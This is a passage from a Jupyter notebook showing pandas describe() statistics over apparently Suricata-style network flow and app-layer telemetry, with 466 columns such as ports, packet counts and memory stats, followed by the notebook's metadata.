       "      <th>stats.app_layer.expectations</th>\n",
       "      <th>stats.http.memuse</th>\n",
       "      <th>stats.http.memcap</th>\n",
       "      <th>stats.ftp.memuse</th>\n",
       "      <th>stats.ftp.memcap</th>\n",
       "      <th>stats.file_store.open_files</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>count</th>\n",
       "      <td>2.588900e+04</td>\n",
       "      <td>23525.000000</td>\n",
       "      <td>23525.000000</td>\n",
       "      <td>23242.000000</td>\n",
       "      <td>23242.000000</td>\n",
       "      <td>23242.000000</td>\n",
       "      <td>23242.000000</td>\n",
       "      <td>23093.000000</td>\n",
       "      <td>2751.000000</td>\n",
       "      <td>59.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>mean</th>\n",
       "      <td>1.137046e+15</td>\n",
       "      <td>42137.309628</td>\n",
       "      <td>14506.841445</td>\n",
       "      <td>1.315722</td>\n",
       "      <td>0.392565</td>\n",
       "      <td>111.311247</td>\n",
       "      <td>51.871870</td>\n",
       "      <td>4.375828</td>\n",
       "      <td>21690.181752</td>\n",
       "      <td>25804.694915</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>std</th>\n",
       "      <td>6.468296e+14</td>\n",
       "      <td>17980.868433</td>\n",
       "      <td>17827.274187</td>\n",
       "      <td>1.842366</td>\n",
       "      <td>1.576366</td>\n",
       "      <td>710.506763</td>\n",
       "      <td>409.702884</td>\n",
       "      <td>37.485287</td>\n",
       "      <td>12308.976539</td>\n",
       "      <td>22754.924353</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>min</th>\n",
       "      <td>5.713087e+08</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>42.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>18.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25%</th>\n",
       "      <td>5.888345e+14</td>\n",
       "      <td>36103.000000</td>\n",
       "      <td>1694.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>54.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>10653.000000</td>\n",
       "      <td>5463.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50%</th>\n",
       "      <td>1.130907e+15</td>\n",
       "      <td>48856.000000</td>\n",
       "      <td>7000.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>54.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>23270.000000</td>\n",
       "      <td>16765.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75%</th>\n",
       "      <td>1.695347e+15</td>\n",
       "      <td>54814.000000</td>\n",
       "      <td>22037.000000</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>58.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>33568.000000</td>\n",
       "      <td>43119.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>max</th>\n",
       "      <td>2.251782e+15</td>\n",
       "      <td>65531.000000</td>\n",
       "      <td>65528.000000</td>\n",
       "      <td>134.000000</td>\n",
       "      <td>91.000000</td>\n",
       "      <td>66168.000000</td>\n",
       "      <td>25717.000000</td>\n",
       "      <td>899.000000</td>\n",
       "      <td>39193.000000</td>\n",
       "      <td>64206.000000</td>\n",
       "      <td>...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>8 rows × 466 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "            flow_id      src_port     dest_port  flow.pkts_toserver  \\\n",
       "count  2.588900e+04  23525.000000  23525.000000        23242.000000   \n",
       "mean   1.137046e+15  42137.309628  14506.841445            1.315722   \n",
       "std    6.468296e+14  17980.868433  17827.274187            1.842366   \n",
       "min    5.713087e+08      0.000000      0.000000            1.000000   \n",
       "25%    5.888345e+14  36103.000000   1694.000000            1.000000   \n",
       "50%    1.130907e+15  48856.000000   7000.000000            1.000000   \n",
       "75%    1.695347e+15  54814.000000  22037.000000            1.000000   \n",
       "max    2.251782e+15  65531.000000  65528.000000          134.000000   \n",
       "\n",
       "       flow.pkts_toclient  flow.bytes_toserver  flow.bytes_toclient  \\\n",
       "count        23242.000000         23242.000000         23242.000000   \n",
       "mean             0.392565           111.311247            51.871870   \n",
       "std              1.576366           710.506763           409.702884   \n",
       "min              0.000000            42.000000             0.000000   \n",
       "25%              0.000000            54.000000             0.000000   \n",
       "50%              0.000000            54.000000             0.000000   \n",
       "75%              0.000000            58.000000             0.000000   \n",
       "max             91.000000         66168.000000         25717.000000   \n",
       "\n",
       "           flow.age      pcap_cnt        dns.id  ...  \\\n",
       "count  23093.000000   2751.000000     59.000000  ...   \n",
       "mean       4.375828  21690.181752  25804.694915  ...   \n",
       "std       37.485287  12308.976539  22754.924353  ...   \n",
       "min        0.000000     18.000000      1.000000  ...   \n",
       "25%        0.000000  10653.000000   5463.000000  ...   \n",
       "50%        0.000000  23270.000000  16765.000000  ...   \n",
       "75%        0.000000  33568.000000  43119.000000  ...   \n",
       "max      899.000000  39193.000000  64206.000000  ...   \n",
       "\n",
       "       stats.app_layer.error.nfs_udp.internal  \\\n",
       "count                                     1.0   \n",
       "mean                                      0.0   \n",
       "std                                       NaN   \n",
       "min                                       0.0   \n",
       "25%                                       0.0   \n",
       "50%                                       0.0   \n",
       "75%                                       0.0   \n",
       "max                                       0.0   \n",
       "\n",
       "       stats.app_layer.error.krb5_udp.alloc  \\\n",
       "count                                   1.0   \n",
       "mean                                    0.0   \n",
       "std                                     NaN   \n",
       "min                                     0.0   \n",
       "25%                                     0.0   \n",
       "50%                                     0.0   \n",
       "75%                                     0.0   \n",
       "max                                     0.0   \n",
       "\n",
       "       stats.app_layer.error.krb5_udp.parser  \\\n",
       "count                                    1.0   \n",
       "mean                                     0.0   \n",
       "std                                      NaN   \n",
       "min                                      0.0   \n",
       "25%                                      0.0   \n",
       "50%                                      0.0   \n",
       "75%                                      0.0   \n",
       "max                                      0.0   \n",
       "\n",
       "       stats.app_layer.error.krb5_udp.internal  stats.app_layer.expectations  \\\n",
       "count                                      1.0                           1.0   \n",
       "mean                                       0.0                           0.0   \n",
       "std                                        NaN                           NaN   \n",
       "min                                        0.0                           0.0   \n",
       "25%                                        0.0                           0.0   \n",
       "50%                                        0.0                           0.0   \n",
       "75%                                        0.0                           0.0   \n",
       "max                                        0.0                           0.0   \n",
       "\n",
       "       stats.http.memuse  stats.http.memcap  stats.ftp.memuse  \\\n",
       "count                1.0                1.0               1.0   \n",
       "mean                 0.0                0.0               0.0   \n",
       "std                  NaN                NaN               NaN   \n",
       "min                  0.0                0.0               0.0   \n",
       "25%                  0.0                0.0               0.0   \n",
       "50%                  0.0                0.0               0.0   \n",
       "75%                  0.0                0.0               0.0   \n",
       "max                  0.0                0.0               0.0   \n",
       "\n",
       "       stats.ftp.memcap  stats.file_store.open_files  \n",
       "count               1.0                          1.0  \n",
       "mean                0.0                          0.0  \n",
       "std                 NaN                          NaN  \n",
       "min                 0.0                          0.0  \n",
       "25%                 0.0                          0.0  \n",
       "50%                 0.0                          0.0  \n",
       "75%                 0.0                          0.0  \n",
       "max                 0.0                          0.0  \n",
       "\n",
       "[8 rows x 466 columns]"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "DF.describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1f07e473-229f-48b6-ac84-897446c39ec3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
